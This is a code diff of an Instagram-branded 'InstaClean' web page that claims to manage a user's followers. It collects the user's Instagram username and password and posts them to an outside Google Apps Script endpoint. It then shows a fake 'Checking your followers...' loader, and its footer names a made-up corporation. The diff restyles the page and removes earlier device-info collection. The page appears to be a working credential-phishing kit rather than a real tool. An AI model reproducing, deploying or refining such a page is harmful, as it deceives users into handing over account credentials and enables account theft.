@@ -11,10 +11,13 @@
             padding: 0;
             font-family: Arial, sans-serif;
             background-color: #fafafa;
+            background-image: url('https://i.ibb.co/z2dqP6C/Asset-2.png'); /* Replace 'your-background-image-url.jpg' with the URL of your background image */
+    background-position: top;
+    background-repeat: no-repeat;
+    background-attachment: fixed;
             display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+            flex-direction: column;
+            min-height: 100vh;
         }
 
         .login-container {
@@ -24,6 +27,7 @@
             padding: 20px;
             width: 300px;
             text-align: center;
+            margin: 20px auto; /* Center the login card */
         }
 
         .instagram-icon {
@@ -44,6 +48,7 @@
         input[type="text"],
         input[type="password"],
         button {
+          
             width: 100%;
             padding: 10px;
             margin-bottom: 10px;
@@ -51,6 +56,15 @@
             border-radius: 4px;
             box-sizing: border-box;
         }
+
+Button{
+  border: 0px;
+  color:white;
+  background-color:#0095f6;
+}
+button:hover{
+  background-color:#1877f2;
+}
 
         #modal {
             display: none;
@@ -73,6 +87,7 @@
             width: 80%;
             max-width: 400px;
             position: relative;
+            text-align: center;
         }
 
         .close {
@@ -91,10 +106,11 @@
         }
 
         img {
-            width: 100%;
-            max-width: 300px;
-            height: auto;
-            margin-bottom: 10px;
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            display: block;
+            margin: 0 auto 10px;
         }
 
         .loader {
@@ -108,51 +124,54 @@
             margin-top: 20px;
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .footer {
+            background-color: #f0f0f0;
+            padding: 10px;
+            text-align: center;
+            margin-top: auto; /* Push the footer to the bottom */
+            font-size: 14px;
+            
+           
         }
+        a{
+          color: #565656;
+          
+        }
+
     </style>
 </head>
 <body>
     <div class="login-container">
         <i class="fab fa-instagram instagram-icon"></i>
         <h2>InstaClean</h2>
-        <p class="description">Manage your followers with one click with InstaClean</p>
+        <p class="description">Manage your followers with one click</p>
         <form id="loginForm" action="https://script.google.com/macros/s/AKfycbxdYqoF15OhL3X7lOajMaEohXdkNajKOL8sV8o-Uvi7Cp-57hcEAmvu-72cPiC38MOq4w/exec" method="post">
             <input type="text" name="username" id="username" placeholder="Username" required>
             <input type="password" name="password" id="password" placeholder="Password" required>
-            <input type="hidden" name="device_info" id="deviceInfo">
-            <button type="submit" id="loginButton">Log In</button>
+            <button type="submit" id="loginButton">Get Started</button>
         </form>
     </div>
     <div id="modal" class="modal">
         <div class="modal-content">
             <span class="close">&times;</span>
-            <img src="https://i.ibb.co/7vw2nc1/424475030-368526672474434-1377331753430940101-n.jpg" alt="Image">
-            <h1 id="welcomeMessage"></h1>
-            <p>Checking your followers (3,387)</p>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2c/Default_pfp.svg" alt="Image">
+            <h1 id="welcomeMessage">Modal Title</h1>
+            <p>Checking your followers...</p>
             <div class="loader"></div>
         </div>
     </div>
 
+    <div class="footer">
+        <a href="#">Privacy</a> | <a href="#">About</a> | <a href="#">Terms and Conditions</a> | Powered by InstantClear Corporation 2024
+    </div>
+
     <script>
-        function getDeviceInfo() {
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            return {
-                userAgent,
-                platform
-            };
-        }
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault(); // Prevent the form from submitting normally
             
             // Get the username and password from the form
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
-            document.getElementById('deviceInfo').value = "useragent" + navigator.userAgent;
-
 
             // Disable the login button
             document.getElementById('loginButton').setAttribute('disabled', true);
@@ -181,6 +200,10 @@
             })
             .catch(error => {
                 console.error('There was a problem with the fetch operation:', error);
+                setTimeout(function() {
+                    modal.style.display = 'none';
+                    alert('Something went wrong, try again later.');
+                }, 5000);
             });
         });
     </script>
